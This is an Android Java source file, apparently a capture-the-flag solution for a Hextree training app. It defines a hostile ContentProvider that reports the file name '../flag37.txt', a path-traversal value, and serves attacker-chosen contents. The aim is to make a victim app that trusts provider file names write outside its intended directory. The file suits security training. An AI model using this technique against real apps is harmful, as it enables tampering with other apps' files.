package com.hextree.getflag;

import android.content.*;
import android.database.*;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.provider.OpenableColumns;
import android.util.Log;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import java.io.*;

public class ContentProviderFlag37 extends ContentProvider {

    @Nullable
    @Override
    public Cursor query(@NonNull Uri uri, @Nullable String[] strings, @Nullable String s, @Nullable String[] strings1, @Nullable String s1) {
        Log.i("AttackProvider", "query("+uri.toString()+")");

        MatrixCursor cursor = new MatrixCursor(new String[]{
                OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE
        });

        cursor.addRow(new Object[]{
                "../flag37.txt", 1337
        });
        return cursor;
    }

    @Override
    public ParcelFileDescriptor openFile(Uri uri, @NonNull String mode) throws FileNotFoundException {
        Log.i("AttackProvider", "openFile(" + uri.toString() + ")");

        try {
            ParcelFileDescriptor[] pipe = ParcelFileDescriptor.createPipe();
            ParcelFileDescriptor.AutoCloseOutputStream outputStream = new ParcelFileDescriptor.AutoCloseOutputStream(pipe[1]);

            new Thread(() -> {
                try {
                    outputStream.write("give flag".getBytes());
                    outputStream.close();
                } catch (IOException e) {
                    Log.e("AttackProvider", "Error in pipeToParcelFileDescriptor", e);
                }
            }).start();

            return pipe[0];
        } catch (IOException e) {
            throw new FileNotFoundException("Could not open pipe for: " + uri.toString());
        }
    }

    @Nullable
    @Override
    public int delete(Uri uri, String selection, String[] selectionArgs) {
        Log.i("AttackProvider", "delete("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public String getType(Uri uri) {
        Log.i("AttackProvider", "getType("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Nullable
    @Override
    public Uri insert(Uri uri, ContentValues values) {
        Log.i("AttackProvider", "insert("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public boolean onCreate() {
        Log.i("AttackProvider", "onCreate()");
        return true;
    }

    @Override
    public int update(Uri uri, ContentValues values, String selection,
                      String[] selectionArgs) {
        Log.i("AttackProvider", "update("+uri.toString()+")");
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
